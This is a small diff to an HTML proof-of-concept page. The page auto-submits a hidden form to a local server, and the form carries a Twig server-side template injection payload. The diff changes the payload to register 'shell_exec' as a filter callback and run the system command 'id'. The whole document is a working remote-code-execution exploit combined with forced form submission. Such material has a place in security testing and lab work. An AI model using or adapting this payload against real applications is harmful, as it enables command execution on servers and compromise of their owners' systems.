@@ -1,5 +1,5 @@
 <form method="POST" action="http://127.0.0.1:4000/">
-        <input type="hidden" name="comment" value="{{7*7}}{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} ">
+       <input type="hidden" name="comment" value='{{7*7}} {{_self.environment.registerUndefinedFilterCallback("shell_exec")}}{{_self.environment.getFilter("id")}}'>
 </form>
 <script>
         document.querySelector("form").submit();
